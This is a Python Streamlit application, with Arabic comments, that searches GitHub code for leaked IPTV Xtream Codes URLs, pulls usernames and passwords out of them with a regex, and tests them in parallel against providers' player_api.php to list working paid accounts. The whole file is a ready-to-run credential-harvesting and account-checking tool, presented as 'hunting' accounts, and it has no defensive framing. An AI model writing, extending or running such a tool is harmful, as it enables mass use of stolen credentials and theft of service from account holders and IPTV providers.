import streamlit as st
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# --- إعدادات الصفحة ---
st.set_page_config(
    page_title="IPTV Ultra Beast - Web Edition",
    page_icon="🌪️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- تنسيق CSS مخصص ليشبه الثيم المظلم ---
st.markdown("""
<style>
    .stApp {
        background-color: #0E1117;
        color: #00FF41;
    }
    .stTextInput > div > div > input {
        color: #00FF41;
    }
    .success-box {
        padding: 10px;
        border-radius: 5px;
        background-color: #1B5E20;
        border: 1px solid #00E676;
        margin-bottom: 10px;
        font-family: monospace;
    }
</style>
""", unsafe_allow_html=True)

# --- إدارة الحالة (Session State) ---
if 'is_hunting' not in st.session_state:
    st.session_state.is_hunting = False
if 'results' not in st.session_state:
    st.session_state.results = []
if 'unique_cache' not in st.session_state:
    st.session_state.unique_cache = set()
if 'checked_count' not in st.session_state:
    st.session_state.checked_count = 0
if 'found_count' not in st.session_state:
    st.session_state.found_count = 0

# --- الدوال الأساسية ---

def check_xtream_worker(host, user, pw):
    # التحقق من التكرار
    u_id = f"{host}{user}"
    if u_id in st.session_state.unique_cache:
        return None
    st.session_state.unique_cache.add(u_id)

    try:
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        # تقليل التايم آوت لزيادة سرعة الويب
        r = requests.get(api_url, timeout=3).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            conn = f"{info.get('active_cons')}/{info.get('max_connections')}"
            return {
                "host": host,
                "user": user,
                "pass": pw,
                "exp": exp,
                "conn": conn
            }
    except:
        return None
    return None

def perform_scan(token):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    massive_dorks = [
        'extension:txt "get.php?username="',
        'extension:m3u "player_api.php"',
        'filename:xtream.txt',
        'iptv+2025+xtream'
    ]
    
    status_placeholder = st.empty()
    
    # استخدام ThreadPoolExecutor داخل حلقة البحث
    with ThreadPoolExecutor(max_workers=50) as executor:
        for dork in massive_dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 6): # تقليل الصفحات قليلاً لتناسب تفاعلية الويب
                if not st.session_state.is_hunting: break
                
                status_placeholder.info(f"🔍 جاري البحث في GitHub: {dork} - صفحة {page}")
                
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if 'items' in res:
                        futures = []
                        for item in res['items']:
                            if not st.session_state.is_hunting: break
                            
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            
                            try:
                                content = requests.get(raw_url, timeout=3).text
                                matches = re.findall(r"(http://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                                
                                for m in matches:
                                    st.session_state.checked_count += 1
                                    # إرسال الفحص للـ Threads
                                    future = executor.submit(check_xtream_worker, m[0], m[1], m[2])
                                    futures.append(future)
                            except: continue
                        
                        # تجميع النتائج من الـ Threads
                        for future in futures:
                            result = future.result()
                            if result:
                                st.session_state.found_count += 1
                                st.session_state.results.insert(0, result) # الأحدث في الأعلى
                                st.toast(f"💎 تم اصطياد حساب جديد! {result['host']}", icon="✅")
                    
                    time.sleep(1) # تفادي الحظر
                except Exception as e:
                    time.sleep(1)
                    continue

# --- واجهة المستخدم (Sidebar) ---
with st.sidebar:
    st.title("ULTRA BEAST V14 🌪️")
    st.markdown("---")
    
    api_token = st.text_input("GitHub Token (ghp_...)", type="password")
    
    col1, col2 = st.columns(2)
    with col1:
        start_btn = st.button("🚀 بدء الصيد", type="primary", use_container_width=True)
    with col2:
        stop_btn = st.button("🛑 إيقاف", type="secondary", use_container_width=True)
    
    st.markdown("---")
    st.metric("💎 شغال (Active)", st.session_state.found_count)
    st.metric("🔍 تم فحص (Checked)", st.session_state.checked_count)

# --- المنطق التشغيلي ---

if start_btn:
    if not api_token:
        st.error("⚠️ يرجى إدخال التوكن أولاً!")
    else:
        st.session_state.is_hunting = True
        st.success("بدأ المحرك في العمل... النتائج ستظهر أدناه")
        perform_scan(api_token)

if stop_btn:
    st.session_state.is_hunting = False
    st.warning("تم إيقاف المحرك.")

# --- منطقة عرض النتائج (Main Area) ---
st.subheader("🖥️ شاشة النتائج الحية")

# حاوية لتحديث النتائج بشكل ديناميكي
results_container = st.container()

with results_container:
    if not st.session_state.results:
        st.info("في انتظار البيانات... (تأكد من صحة التوكن)")
    
    for res in st.session_state.results:
        st.markdown(f"""
        <div class="success-box">
            <b>✅ ACTIVE</b> | Exp: {res['exp']} | Conn: {res['conn']}<br>
            HOST: {res['host']}<br>
            USER: {res['user']} | PASS: {res['pass']}
        </div>
        """, unsafe_allow_html=True)